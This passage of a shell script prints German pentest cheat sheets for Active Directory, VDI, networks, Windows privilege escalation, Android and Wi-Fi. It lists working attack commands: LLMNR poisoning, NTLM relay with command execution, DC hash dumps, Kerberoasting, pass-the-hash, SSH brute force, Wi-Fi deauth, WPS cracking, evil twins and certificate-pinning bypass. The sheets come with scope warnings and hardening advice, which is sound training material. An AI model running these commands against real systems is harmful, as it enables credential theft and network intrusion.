${BLUEBOLD}## 4. AD-Enumeration (Benutzer, Gruppen, Computer, Policies)${RESET}
# PowerView (PowerShell)
Invoke-ShareFinder
Get-NetUser -Domain example.local
Get-NetComputer
Get-NetGroup -GroupName 'Domain Admins'
# SharpHound collection (Eigenart: viele Optionen — nutze nur erlaubte Collections)
Invoke-BloodHound -CollectionMethod All
# LDAP (lesend) – schonend
ldapsearch -x -h dc -b 'dc=example,dc=local' '(memberOf=*)'

${BLUEBOLD}## 5. Credentials & Credential-Harvesting (vorsichtig)${RESET}
# LLMNR/NBT-NS Poisoning (Responder) - RISIKO: sehr laut! nur mit Freigabe und Zeitbox
responder -I eth0 -wrf  # zeigt NetBIOS/LLMNR Antworten (Achtung: kann Log-Einträge verursachen)
# NTLM Relay (ntlmrelayx) - sehr riskant, nur Lab/ausdrücklich erlaubt
ntlmrelayx.py -tf targets.txt -smb2support -c 'cmd.exe /c whoami'
# Hash-Dumps / LSA Secrets (nur mit Recht/Scope)
impacket-secretsdump -just-dc-ntlm DOMAIN/admin:Password@dc.example.local
# Kerberoasting (GetUserSPNs.py)
python3 GetUserSPNs.py -request -dc-ip dc.example.local example.local/user:password
# AS-REP Roast (wenn user ohne pre-auth)
GetNPUsers.py -no-preauth -dc-ip dc.example.local example.local/ -csv -output asrep.csv

${BLUEBOLD}## 6. Auf Authentifizierung basierte Angriffe (Kerberos)${RESET}
# Rubeus (Kerberos tooling) – Ticket Requests, Overpass-the-Hash, etc.
# Beispiel: AS-REP-Abfrage / Kerberoast-Verarbeitung erfolgt offline mit Hashcat/John
rubeus.exe kerberoast /domain:example.local /outfile:krb_hashes.txt

${BLUEBOLD}## 7. Lateral Movement (vorsichtig & nach Genehmigung)${RESET}
# Pass-the-Hash / Pass-the-Ticket (nur in Testumgebungen)
# Impacket: wmiexec / psexec
python3 /path/to/impacket/examples/wmiexec.py 'DOMAIN/username:hash'@target
python3 /path/to/impacket/examples/psexec.py 'DOMAIN/username:hash'@target
# CrackMapExec (CME) – schnelle Validierung von Credentials
cme smb 10.0.0.0/24 -u users.txt -p passwords.txt --continue-on-success

${BLUEBOLD}## 8. Privilege Escalation in AD (häufige Vektoren)${RESET}
# DCSync (Benötigt Replikationsrechte) — sehr sensibel
# Mimikatz / secretsdump ermöglichen DCSync-ähnliche Aktionen (nur mit Freigabe)
# Kerberos Delegation: Überprüfe unconstrained/limited delegation
Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo | Where { \$_.msDS-AllowedToDelegateTo }
# ACL Abuse (AbuseACL) — z. B. user mit 'WriteDacl' auf DA
# BloodHound liefert 'Shortest paths to Domain Admins' — priorisieren & manuell prüfen

${BLUEBOLD}## 9. Persistence (nur dokumentieren, nicht dauerhaft implementieren ohne Erlaubnis)${RESET}
# Beispiele, was Angreifer tun könnten (dokumentieren, nachweisen, aber nicht implementieren):
# - Scheduled Tasks mit hohem Privilege
# - Service Binary Path Manipulation (wenn Service mit SYSTEM-Rechten läuft)
# - Golden Ticket (Kerberos) — zeigt Auswirkung, niemals dauerhaft erstellen in Prod

${BLUEBOLD}## 10. Forensik- & Detection-Respekt (Beweise sichern)${RESET}
# Sichern: Logs, Timestamps, gefundene Hashes/Artifacts
# Beweise: evtl. Eventlog-Snapshots (evt. per Windows-Admin vor Ort) – niemals produktiv verändern
# Hinweis: Spuren hinterlassen – kommuniziere mit SOC, damit Events eingeordnet werden

${BLUEBOLD}## 11. Cleanup & Minimaler Impact${RESET}
# Lösungen/Kommandos zum Zurücksetzen (Beispielhaft & vorsichtig)
# - Entferne temporäre Tools/Backdoors
# - Entferne SMB-Sessions / offene Handles
# - Informiere alle relevanten Teams über durchgeführte Aktionen

${BLUEBOLD}## 12. Reporting & Remediation (konkret)${RESET}
# Priorisiere nach Impact & Exploitability:
# - Kritisch: DCSync / Domain Admin / Credential Harvesting möglich
# - Hoch: Kerberoastable Service Account mit SPN + schwache Passwörter
# - Mittel: Ungepatchte DC-Services / LDAP-Sensitive Settings
# Quick-Wins:
# - Passwortrichtlinien stärken & Service-Accounts rotieren
# - LLMNR/NetBIOS abschalten, DNS-Hardening
# - GPOs & ACLs prüfen (least privilege)
# Maßnahmen:
# - MFA für Administratoren, LAPS für lokale Admin-Passwörter
# - Monitoring: Kerberos-Anomalien, ungewöhnliche DCSync/Aufrufe, NTLM-Relay-Detection

${BLUEBOLD}## 13. Nützliche Befehlsbeispiele (nur Referenz)${RESET}
# SMB enumeration
smbclient -L \\\\10.0.0.5 -U 'DOMAIN\\user'
# RPC enumeration
rpcclient -U 'user%pass' 10.0.0.5 -c 'enumdomusers'
# Impacket psexec
python3 /opt/impacket/examples/psexec.py 'DOMAIN/user:Password'@10.0.0.5
# GetUserSPNs (Kerberoast)
python3 /opt/kerberos/tools/GetUserSPNs.py -request -dc-ip 10.0.0.5 domain/user:password
# BloodHound ingestion (SharpHound)
Invoke-BloodHound -CollectionMethod All -Domain example.local -ZipFileName results.zip

${YELLOW}================================================================================${RESET}
${CYAN}--------------------------------------------------------------------------------${RESET}
${YELLOW}================================================================================${RESET}
"
}

my_thinclient(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}======================[ Thin Client / VDI Penetration Testing ]======================${RESET}
${YELLOW}================================================================================${RESET}

${REDBOLD}### 0. Rechtliches & Sicherheitsrahmen${RESET}
- Teste nur Systeme, die ausdrücklich in Scope sind (Thin Clients, Broker, VDI-Images, Storage).  
- Klare Abbruchkriterien, Notfallkontakt, Timeline und schriftliche Genehmigung sind Pflicht.  
- Thin-Client-Umgebungen berühren Benutzer-Produktivität unmittelbar — erhöhte Vorsicht.

${BLUEBOLD}## 1. Ziel & Kontext${RESET}
- Thin Clients (RDP, PCoIP, ICA/HDX, Blast, VMware/Horizon, Citrix) sind Endpunkte zu zentralen Desktops/Servern.  
- Häufige Ziele: Authentifizierung, Session-Isolation, Client-Server-Kommunikation, USB/Peripherie-Schutz, Broker-Security, Image-Sicherheit.

${BLUEBOLD}## 2. Umfeld / Test-Setup${RESET}
- Testumgebung: Dedizierte Test-VDI-Umgebung oder Lab mit Broker (Connection Server), Thin-Client-Image und Test-Endpoints.  
- Tools: nmap, masscan, wireshark/tshark, bettercap, mitmproxy, freerdp/xfreerdp, rdesktop, xrdp, smbclient, enum4linux, burpsuite, responder (nur mit Freigabe), PowerShell/PSExec, BloodHound für hinterlegte AD-Integration.

${BLUEBOLD}## 3. Discovery & Inventory (schonend)${RESET}
nmap -sS -Pn -p 3389,1494,2598,4172,8443,443 --open -oN thin_nmap 10.0.0.0/24
# RDP (3389), Citrix ICA/Session-Brokers (1494/2598), VMware Blast/PCoIP (4172), admin-UI (8443)
# Identifiziere Broker, Connection-Server, Provisioning-Server, Image-Repository

${BLUEBOLD}## 4. Service-Fingerprinting & Banner (schonend)${RESET}
nmap -sV --script=banner -p 3389,8443,443 <host>
curl -I https://broker.example.local:8443
# Prüfe TLS-Zertifikate, HTTP-Header, security-headers

${BLUEBOLD}## 5. Protokoll-Analyse (Passiv & MitM wenn erlaubt)${RESET}
# Passiv
tshark -i any -f 'tcp port 3389 or tcp port 4172' -w thin_capture.pcap
# MitM (nur mit Freigabe und CA installiert): bettercap / mitmproxy um SSL/TLS zu prüfen
# Beispiel: installiere Test-CA in Test-Clients → validiere, ob RDP/ICA/Blast auf TLS prüft

${BLUEBOLD}## 6. Authentifizierungs-Checks (NLA, Smartcard, Certs)${RESET}
# Prüfe ob NLA (Network Level Authentication) aktiviert ist (RDP)
xfreerdp /v:host /cert-ignore  # nur zur Erkennung; /cert-ignore NICHT für Exploits
# Prüfe Smartcard-/Certificate-Auth-Integration, ob Fallback auf Passwort möglich ist

${BLUEBOLD}## 7. Thin-Client-Image & Provisioning (Offline-Checks)${RESET}
# Überprüfe Images: integrity, signaturen, nicht benötigte Dienste, default credentials
# Beispiel: mount / untersuche Konfigurationsdateien, remove default accounts
strings thinclient_image.img | grep -i 'password\|admin\|root'
md5sum thinclient_image.img

${BLUEBOLD}## 8. Peripherie-Attacken (USB, Smartcard, Redirect) — nur lab/mit Freigabe${RESET}
# Prüfe, ob USB-Redirection erlaubt ist und welche Geräte weitergeleitet werden
# Simuliere (kontrolliert) USB-Geräte in Laborumgebung, evaluiere Policies (kein Payload-Disclosure)
# Beispiel: Testen ob lokale Laufwerke/Clipboard mit der Session geteilt werden

${BLUEBOLD}## 9. Session-Isolation & Lateral-Movement-Prüfungen${RESET}
# Prüfe, ob Terminal-Sessions untereinander isoliert sind (z. B. Shared Profile Issues)
# Wenn Zugang auf VDI-VM besteht: evaluiere Netzwerkrestriktionen, Credentials, Laufwerkszugriffe
# Tools: smbclient / rpcclient / PowerShell-Remoting testen (nur autorisiert)

${BLUEBOLD}## 10. Credential- & Relay-Risiken (LLMNR/NTLM etc.) — vorsichtig!${RESET}
# In manchen Umgebungen sprechen Thin Clients lokale Dienste an und können anfällig sein
# NetBIOS/LLMNR-Tests nur mit Freigabe: responder -I eth0 -wrf (Achtung Lautstärke)
# Prüfe ob Broker/Connection-Server NTLM-Fallback erlaubt — evtl. Relay-Angriffspfade

${BLUEBOLD}## 11. Gateway/Broker/Portal Absicherung prüfen${RESET}
# Admin-UI absichern? Check Login-Endpoints, MFA, Session-Timeouts, Rate-Limiting
curl -I https://broker.example.local:8443
# Prüfe Zertifikatswechsel, Auth-Header, SameSite, Secure Flags

${BLUEBOLD}## 12. Hardening-Empfehlungen (Konkrete Punkte)${RESET}
- Erzwinge NLA / TLS für RDP und sichere Konfiguration für ICA/Blast/PCoIP.  
- Deaktiviere automatische USB-Redirection oder whiteliste Gerätetypen.  
- Härtung der Thin-Client-Images: remove unused services, patch-package-management, signierte images.  
- Starke Authentifizierung / MFA am Broker / Connection-Server.  
- Netzwerk-Segmentierung: VDI-Hosts in separatem VLAN, restriktive ACLs.  
- Monitoring: Session-Anomalien, unerwartete Device-Redirects, ungewöhnliche Authentifizierungsversuche.

${BLUEBOLD}## 13. Reporting & Priorisierung${RESET}
# Management-Summary: Risiko, Impact auf Users & Business, empfohlene Sofortmaßnahme
# Technisch: reproduzierbarer Nachweis, pcap/snippets, betroffene Host-IDs, empfohlene Konfig-Änderungen
# Quick-Wins: NLA aktivieren, USB-Redirection einschränken, Broker-Admin-Hardening

${BLUEBOLD}## 14. Cleanup & Evidence Handling${RESET}
# Beende Capture-Tools, sichere pcap mit checksums, reinige temporäre Dateien
shred -u thin_capture.pcap 2>/dev/null || rm -f thin_capture.pcap
# Dokumentiere Zeitstempel, Testpersona, Scope

${YELLOW}================================================================================${RESET}
${CYAN}--------------------------------------------------------------------------------${RESET}
${YELLOW}================================================================================${RESET}
"
}

my_network(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}==========================[ Network Penetration Testing Reference ]==========================${RESET}
${YELLOW}================================================================================${RESET}

${REDBOLD}### 0. Wichtig / Legal${RESET}
- Protokolliere jeden Schritt, vermeide unnötige Last und halte Notfall-Abbruchkriterien bereit.

${BLUEBOLD}## 1. Umfeld & Vorbereitung${RESET}
# Prüfe deine Schnittstellen
ip a
ip route
ss -tunlp
# Setze Zeitstempel / Logfiles
date && echo \"Start: $(date)\" > network_tests.log

${BLUEBOLD}## 2. Schnelle Zielerkennung (Discovery)${RESET}
# kleine, schonende Erkundung
nmap -sn 10.0.0.0/24                      # Ping-Scan: welche Hosts leben?
arp-scan --localnet                      # ARP-basierte LAN-Erkennung
# schnelle Portübersicht (sparsamer)
masscan 10.0.0.0/24 -p1-65535 --rate=1000 -oG masscan.out

${BLUEBOLD}## 3. Port- und Service-Scanning (gezielt)${RESET}
# Nmap: Service + Version + Script-Basis
nmap -sS -Pn -p- --min-rate=1000 -oA nmap_full 10.0.0.5
nmap -sV -sC -p 22,80,443,3306 -oN nmap_services 10.0.0.5
# Intensivere Service-Fingerprinting nur nach Absprache
nmap -sV --version-all --script vuln -oN nmap_vuln 10.0.0.5

${BLUEBOLD}## 4. Enumeration nach Diensttyp${RESET}
# SSH
ssh -v user@10.0.0.5
# SMB/Windows
smbclient -L //10.0.0.5 -N
enum4linux -a 10.0.0.5
# RPC / NFS
rpcinfo -p 10.0.0.5
showmount -e 10.0.0.5
# HTTP
curl -I http://10.0.0.5
gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/raft-large-directories.txt -t 40
# Databases
mysql -h 10.0.0.5 -u root -p
# SNMP
snmpwalk -c public -v2c 10.0.0.5

${BLUEBOLD}## 5. Schwachstellensuche (non-destructive)${RESET}
# Automatische Scanner (Ergebnisse manuell prüfen)
nikto -h http://10.0.0.5 -o nikto.out
# sqlmap (nur wenn Parameter/Endpoint existiert und autorisiert)
sqlmap -u 'http://10.0.0.5/page.php?id=1' --batch --level=2 --risk=1 --crawl=0
# Nuclei (kuratierte Templates)
nuclei -l hosts.txt -t /path/to/nuclei-templates/ -o nuclei.out

${BLUEBOLD}## 6. Authentifizierungs- & Bruteforce-Checks (vorsichtig)${RESET}
# Hydra für Passwort-Checks (nur mit Scope/Erlaubnis)
hydra -L users.txt -P passwords.txt ssh://10.0.0.5 -t 4
# Ratenbegrenzung beachten; niemals ohne Freigabe gegen Internet-Services

${BLUEBOLD}## 7. Protokollanalyse & Traffic Capture${RESET}
tcpdump -i eth0 -w capture.pcap host 10.0.0.5 and port 80
tshark -r capture.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri
# Wireshark für tiefere Analyse:
wireshark capture.pcap

${BLUEBOLD}## 8. Post-Discovery / Kontextualisierung${RESET}
# Zusammenfassen: offene Dienste, Versionsinfos, mögliche CVEs
# (Beispiel: checken ob Version XYZ unter CVE-DB bekannt ist)
# Manuelle Verifizierung statt blinder Exploits

${BLUEBOLD}## 9. Pivoting & Tunneling (nur mit ausdrücklicher Freigabe)${RESET}
# Beispiel-Tools: sshuttle, socat, ssh port-forwarding, chisel (nur bei expliziter Genehmigung)
# sshuttle --dns -r user@jumpbox 10.0.0.0/24
# socat TCP-LISTEN:4444,fork TCP:10.0.0.5:3389

${BLUEBOLD}## 10. Exploit- & Verify-Phase (nur bei Scope & Freigabe)${RESET}
# Wenn ein expliziter Exploit nötig ist: vorher Risiko-Besprechung, Backout-Plan & Timebox.
# Metasploit (nur in kontrollierter Umgebung)
msfconsole -q
# use auxiliary/scanner/...
# run only after approval; dokumentiere alle Aktionen

${BLUEBOLD}## 11. Privilegien & Seiteneffekte prüfen${RESET}
# Falls Zugang erreicht: was kann der Account sehen / erreichen?
# Netzwerksichtbarkeit prüfen: netstat, route, ip neigh
# Dateisystemzugriff minimal prüfen, keine Massendaten exfiltrieren

${BLUEBOLD}## 12. Clean-Up & Wiederherstellung${RESET}
# Beende Capture-Tools, setze Services zurück
pkill -f tcpdump
# Lösche temporäre Dateien/Logs sensibel
shred -u capture.pcap 2>/dev/null || rm -f capture.pcap
# Dokumentation abschließen

${BLUEBOLD}## 13. Reporting & Priorisierung${RESET}
# Management-Summary (kurz): 1-2 Sätze zu Risiko & Empfehlung
# Technischer Report: reproduzierbare Nachweise, betroffene Hosts, CVSS/Impact-Einschätzung
# Konkrete Maßnahmen: Patching, Firewall-ACLs, Zugangsbeschränkungen, Härtung

${YELLOW}================================================================================${RESET}
${CYAN}--------------------------------------------------------------------------------${RESET}
${YELLOW}================================================================================${RESET}
"
}

my_windows_privs(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}========================[ Windows Privilege Escalation Reference ]========================${RESET}
${YELLOW}================================================================================${RESET}

${REDBOLD}### 0. Legal / Ethik / Scope${RESET}
- Führe diese Prüfungen nur mit schriftlicher Freigabe im vereinbarten Scope durch.
- Privilegien- und Credential-Tests sind hochriskant: Timebox, Abbruchkriterien und Notfallkontakt sind Pflicht.
- Protokolliere alle Aktionen und sichere Beweise verantwortungsbewusst. Keine dauerhaften Änderungen ohne Zustimmung.

${BLUEBOLD}## 1. Ziel & Methodik${RESET}
- Ziel: Herausfinden, welche Accounts höhere Rechte erreichen können oder welche Fehlkonfigurationen ein Privilege Escalation erlauben.
- Ablauf: Erst passive Erhebung → sichere, nicht-destruktive Prüfungen → nur nach Freigabe aktive Validierung (keine dauerhaften Änderungen).
- Fokus auf: lokale Accounts, Gruppen, Services, Scheduled Tasks, Datei-/ACL-Rechte, Credential-Exposure, UAC, LAPS, Patch-Level.

${BLUEBOLD}## 2. Basis-Informationen (schnell & sicher)${RESET}
# Lokale Identität & System-Info
whoami
whoami /priv
whoami /all
systeminfo
set

# Benutzer / Gruppen
net user
net user <username>
net localgroup

# Laufende Prozesse / Dienste
tasklist /v
sc queryex type=service state=all
wmic service get Name,DisplayName,State,StartMode,PathName

# Sitzungen / RDP
query user
qwinsta

${BLUEBOLD}## 3. Datei- & ACL-Checks (suchen nach schreibbaren, sensiblen Orten)${RESET}
# Prüfe Schreibrechte an wichtigen Pfaden (z. B. Service-Binary-Verzeichnisse, Program Files)
icacls 'C:\\Program Files\\SomeApp'
icacls 'C:\\Program Files\\SomeApp\\service.exe'

# Suche rekursiv nach Dateien mit schwachen Rechten (PowerShell-Beispiel)
powershell -Command 'Get-ChildItem -Path C:\\ -Recurse -ErrorAction SilentlyContinue | ?{ (Get-Acl $_.FullName).AccessToString -match 'Everyone' }'

# Temporäre Ordner / Backup-Files
dir /s /b C:\\Users\\*\\AppData\\Local\\Temp\\*.bak
dir /s /b C:\\Users\\*\\*.ini C:\\Users\\*\\*.config

${BLUEBOLD}## 4. Services & Unquoted Service Paths / Weak Service Permissions${RESET}
# Unquoted service path detection (PowerShell / manual)
wmic service get name,displayname,pathname,startmode | findstr /i \"C:\\Program Files\"

# Prüfe, ob Service-Binaries schreibbar sind (icacls)
icacls \"C:\\Program Files\\Vulnerable\\svc.exe\"

# Service als Einstieg: kann ein Standard-User eine Datei an dem Pfad ersetzen?

${BLUEBOLD}## 5. Scheduled Tasks & Autorun-Mechanismen${RESET}
schtasks /query /fo LIST /v
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

# Autostart-Ordner prüfen
dir C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup

${BLUEBOLD}## 6. Stored Credentials & Secrets (vorsichtig analysieren)${RESET}
# Suche nach Klartext-Keys / Tokens / Config-Files
findstr /s /i /m \"password api_key secret token\" C:\\Users\\*\\*.* 2>nul

# Windows Credential Store / Cached creds Hinweise (keine direkte Extraktion ohne Freigabe)
# Überprüfe, ob Passwörter in Konfigs, Scheduled Tasks, IIS-AppPools oder Service-Accounts stecken

${BLUEBOLD}## 7. LAPS, Policies & Passwort-Management${RESET}
# Prüfe ob LAPS eingesetzt wird (Local Administrator Password Solution)
# Prüfe GPOs auf Passwort-Policies / Delegation
gpresult /r
secedit /export /cfg seccfg.txt

${BLUEBOLD}## 8. UAC, Token-Privilegien & Integrity Levels${RESET}
# Prüfe UAC-Level & Token-Eigenschaften
whoami /groups
whoami /priv
# Prüfe, ob Token-Elevation durch Auto-Elevate-Programme möglich ist (nur Indikation)

${BLUEBOLD}## 9. Patch-Level & bekannte Kernel-/Driver-Vektoren (nur Bewusstmachen)${RESET}
systeminfo | findstr /i \"KB\"
# Prüfe veraltete Treiber / bekannte CVEs (manuell mit CVE-DB abgleichen)
# Hinweis: Kernel-Exploits sind gefährlich; niemals ohne ausdrückliche Genehmigung in Prod testen.

${BLUEBOLD}## 10. Tools zur lokalen Analyse (nutze sie verantwortungsvoll)${RESET}
# WinPEAS (automatisierte lokale Checks, viele nützliche Prüfungen)
# https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
# PowerUp / Sherlock / Seatbelt / SharpUp für gezielte Checks (nur lokal oder mit Erlaubnis)
# Mimikatz / Rubeus / secretsdump -> nur in Labor/mit Freigabe, sehr sensibel

${BLUEBOLD}## 11. Beispiele für sichere, nicht-destructive Prüfungen${RESET}
# Prüfe ob 'SeImpersonatePrivilege' oder 'SeAssignPrimaryTokenPrivilege' vorhanden sind (whoami /priv)
whoami /priv | findstr /i \"SeImpersonatePrivilege\"

# Liste lokale Admins
net localgroup Administrators

# Prüfe ob Service-Accounts schwache Passwörter haben (nur mit Genehmigung; z. B. Kerberoast-Checks)
# Kerberoastable-Check: suche nach SPNs in AD (AD-scope nötig)

${BLUEBOLD}## 12. Nachweis-Prinzipien & Minimaler Impact${RESET}
- Nutze passive/lesende Prüfungen als Erstes (Inventarisierung, ACL-Checks, Datei-Scans).  
- Wenn aktive Validierung nötig ist (z. B. Proof of Concept, Nachweis einer verwundbaren Service-Path), dann:  
  * Nur auf Test/Backup-Systemen oder nach Absprache,  
  * Dokumentiere Zeit, Ziel, erwartetes Verhalten, Abbruchkriterien.  
- Keine dauerhaften Backdoors, keine Passwort-Änderungen, keine Exfiltration von Produktionsdaten.

${BLUEBOLD}## 13. Remediation-Praktiken (konkret)${RESET}
- Service-Binaries immer in \"quoted paths\" installieren oder Pfade korrekt quoten; harte Fixes: Datei-ACLs korrigieren.  
- Prinzip der geringsten Rechte: keine unnötigen local admin Konten; nutze LAPS oder Managed Service Accounts.  
- Entferne Klartext-Secrets aus Dateien; sichere Konfigs in Secret Vaults (z. B. Azure Key Vault).  
- Patch-Management für Treiber & Windows Updates.  
- Härtung von Scheduled Tasks / Start-Services / GPOs; Monitoring auf anomalem Prozessstart & Privilege-Abuse.  
- Aktivieren von EDR/AV mit Richtlinien, Audit-Logging, Threat-Detection.

${BLUEBOLD}## 14. Reporting: Wie du Befunde formulierst${RESET}
- Management-Summary: kurze Risiko-Einschätzung + Business-Impact.  
- Technische Befunde: reproduzierbarer Nachweis, betroffene Hosts, betroffene Konten, empfohlene Maßnahmen.  
- Priorisierung: Sofortmaßnahme (z. B. schreibbare Service-Binaries), Mittelfristig (LAPS, ACL-Review), Langfristig (Monitoring, Architektur).

${YELLOW}================================================================================${RESET}
${CYAN}--------------------------------------------------------------------------------${RESET}
${YELLOW}================================================================================${RESET}
"
}

my_android(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}======================[ Android Penetration Testing Methodology ]======================${RESET}
${YELLOW}================================================================================${RESET}

${REDBOLD}### 1. Überblick${RESET}
- Android Pentesting überprüft mobile Apps auf Sicherheitslücken, Datenlecks und unsichere Kommunikation.
- Ziel: Schwachstellen in APKs, API-Calls, Speicher, Berechtigungen und Backend-Integrationen aufdecken.
- Methodisch ähnlich wie Web-Pentests, aber mit Fokus auf mobile Besonderheiten.

${BLUEBOLD}## 2. Setup der Testumgebung${RESET}
# 🔹 Emulator / Geräte
Android Studio AVD, Genymotion oder physisches Gerät mit Root.
adb devices                          # Geräte anzeigen
adb root                             # Root aktivieren (wenn möglich)
adb shell                            # Shell öffnen
adb install app.apk                  # APK installieren
adb uninstall com.example.app        # Deinstallieren
adb pull /sdcard/Download/file.txt   # Datei extrahieren
adb logcat                           # Logs lesen (Fehler, API Keys, Tokens)
adb tcpip 5555                       # WLAN-Debugging aktivieren

# 🔹 Proxy & Traffic-Inspection
- BurpSuite oder mit Frida/Objection kombiniert.
- Zertifikat auf Gerät installieren (user CA)
- App ggf. dekompilieren und Zertifikats-Pinning umgehen.

${BLUEBOLD}## 3. Statische Analyse${RESET}
# 🔹 Entpacken & Überblick
apktool d app.apk                    # Dekompilieren zu Smali-Code
jadx-gui app.apk                     # GUI-Decompiler für Java-Code
unzip app.apk -d extracted/          # Roh-Struktur analysieren
file extracted/*                     # Dateitypen prüfen

# 🔹 Metadaten & Manifest
cat AndroidManifest.xml              # Berechtigungen prüfen
grep -i 'permission' AndroidManifest.xml
grep -i 'debuggable' AndroidManifest.xml
grep -i 'exported' AndroidManifest.xml

# 🔹 Sensitive Informationen
grep -R 'http' -n                    # API-Endpunkte
grep -R 'key' -n                     # Keys, Tokens
grep -R 'secret' -n
grep -R 'password' -n

# 🔹 Signatur & Zertifikat
keytool -printcert -file META-INF/*.RSA
apksigner verify --verbose app.apk

${BLUEBOLD}## 4. Dynamische Analyse${RESET}
# 🔹 Laufzeitmanipulation
frida-ps -U                          # Aktive Prozesse
frida -U -f com.example.app -l script.js --no-pause
objection -g com.example.app explore # Laufzeitinjektion (Bypass Root-Check, Pinning etc.)

# 🔹 Netzwerk
mitmproxy, Burp oder bettercap zur Kontrolle des HTTPS-Traffics
grep 'https://' -R .                 # API-Kommunikation prüfen
tcpdump -i any -w capture.pcap       # Netzwerkverkehr mitschneiden
wireshark capture.pcap               # Analyse

# 🔹 Root Detection / Pinning
objection -g com.example.app explore
android sslpinning disable           # Pinning-Bypass
android root disable                 # Root-Detection-Bypass

${BLUEBOLD}## 5. Reverse Engineering${RESET}
# 🔹 Smali → Java
jadx -d output/ app.apk
# 🔹 Ressourcen
apktool d app.apk -o app_source/
# 🔹 Native Binaries
strings lib/armeabi-v7a/*.so | grep -i 'password'
objdump -d lib/armeabi-v7a/libnative.so | less

${BLUEBOLD}## 6. Schwachstellen-Testfälle${RESET}
- Unsichere Datenspeicherung:
  grep -R 'SharedPreferences' .
  grep -R 'MODE_WORLD_READABLE' .
  adb shell ls /data/data/com.example.app/shared_prefs/
- Hardcoded Credentials:
  grep -i 'api_key' -R .
  grep -i 'token' -R .
- Unsichere Kommunikation:
  Prüfen auf Klartext-HTTP, unverschlüsselte Daten.
- WebView Exploits:
  Suchen nach addJavascriptInterface, setJavaScriptEnabled(true)
- Code Injection:
  Unsichere eval(), dynamic code loading (DexClassLoader)
- Backup Enabled:
  grep -i 'allowBackup' AndroidManifest.xml

${BLUEBOLD}## 7. API & Backend Tests${RESET}
# 🔹 API-Endpunkte aus der App extrahieren
grep -R 'http' -n app_source/
# 🔹 Mit Burp oder Postman testen
# 🔹 Authentifizierungsmechanismen prüfen
# 🔹 Fehlende Ratelimits, IDORs, Insecure Direct Object References

${BLUEBOLD}## 8. Root Detection & Bypass${RESET}
grep -R 'isDeviceRooted' .
grep -R 'checkRoot' .
objection -g com.example.app explore
android root disable

${BLUEBOLD}## 9. Malware & Obfuscation${RESET}
- Prüfen auf obfuscierte Klassen oder Strings
  z.B. a.a.a, b.b.b
- Prüfen auf ungewöhnliche Berechtigungen oder Netzkommunikation.
- Online-Scans:
  https://www.virustotal.com
  https://www.apkcombo.com/de/apk-analyzer/

${BLUEBOLD}## 10. Reporting & Cleanup${RESET}
- Dokumentiere jede Schwachstelle mit Screenshots, Codeausschnitten und Impact.
- Empfohlene Fixes: 
  * Pinning richtig implementieren (z. B. TrustManager)
  * Kein Backup, keine Hardcoded Credentials
  * HTTPS erzwingen
  * Datenverschlüsselung lokal
- Bereinigen:
  adb uninstall com.example.app
  rm -rf extracted/ app_source/ *.cap

${YELLOW}================================================================================${RESET}
${CYAN}**Hinweis:** Diese Befehle dienen ausschließlich der Sicherheitsüberprüfung autorisierter Android-Apps.
Ziel ist, Schwachstellen zu identifizieren – nicht sie auszunutzen.${RESET}
${YELLOW}================================================================================${RESET}
"
}


my_wifi(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}====================[ Wi-Fi / WLAN Penetration Testing Reference ]====================${RESET}
${YELLOW}================================================================================${RESET}

${REDBOLD}### 1. Überblick & Grundsätzliches${RESET}
- WLAN-Pentesting prüft, wie sicher drahtlose Netzwerke gegen unbefugten Zugriff sind.
- Ziel: Schwache Passwörter, fehlerhafte Authentifizierung, oder fehlerhafte Konfiguration aufdecken.
- Tools wie aircrack-ng, hcxdumptool, bettercap und Wireshark sind Standardwerkzeuge.

${BLUEBOLD}## 2. Netzwerkkarten & Monitor-Mode${RESET}
iwconfig                               # Zeigt WLAN-Interfaces an
sudo airmon-ng check kill              # Stoppt störende Prozesse
sudo airmon-ng start wlan0             # Aktiviert Monitor-Mode
sudo airmon-ng stop wlan0mon           # Deaktiviert Monitor-Mode
sudo iwconfig wlan0 mode monitor       # Alternative Methode

${BLUEBOLD}## 3. Netzwerk-Scan & Discovery${RESET}
sudo airodump-ng wlan0mon              # Listet alle sichtbaren Access Points
sudo airodump-ng -c [Kanal] --bssid [BSSID] -w capture wlan0mon
# -> Speichert Handshake-Pakete in capture.cap

sudo wash -i wlan0mon                  # Erkennt WPS-aktivierte Router
sudo wifite                            # Automatisiert Discovery & Attacken

${BLUEBOLD}## 4. WEP Angriffe (veraltet, aber prüfenswert)${RESET}
sudo airodump-ng -c [channel] --bssid [BSSID] -w wep wlan0mon
sudo aireplay-ng -1 0 -a [BSSID] wlan0mon          # Authentifizierung
sudo aireplay-ng -3 -b [BSSID] wlan0mon            # ARP Replay Attack
sudo aircrack-ng wep*.cap                         # Schlüssel knacken

${BLUEBOLD}## 5. WPA/WPA2 PSK – Handshake Capturing${RESET}
sudo airodump-ng -c [channel] --bssid [BSSID] -w wpa wlan0mon
sudo aireplay-ng -0 10 -a [BSSID] -c [Client-MAC] wlan0mon   # Deauth-Angriff
# -> Nach Deauth verbindet sich der Client neu, Handshake wird mitgeschnitten

sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa*.cap
# -> Passwort-Hash wird gegen Wordlist geprüft

${BLUEBOLD}## 6. WPA3 & SAE Testing${RESET}
sudo hcxdumptool -i wlan0mon -o capture.pcapng --active
sudo hcxpcapngtool -o hash.hc22000 -E essidlist capture.pcapng
hashcat -m 22000 hash.hc22000 -a 0 wordlist.txt

${BLUEBOLD}## 7. WPS Attacken${RESET}
sudo wash -i wlan0mon
sudo reaver -i wlan0mon -b [BSSID] -vv -K 1          # PIN-Wiederherstellung
sudo bully wlan0mon -b [BSSID] -c [Kanal] -v 3       # Alternativer WPS-Bruteforce

${BLUEBOLD}## 8. Evil Twin / Rogue AP${RESET}
sudo airbase-ng -e \"Free_WiFi\" -c 6 wlan0mon
sudo ifconfig at0 up
sudo dhcpd at0
# -> Lockt Clients an gefälschtes WLAN, prüft Clientverhalten

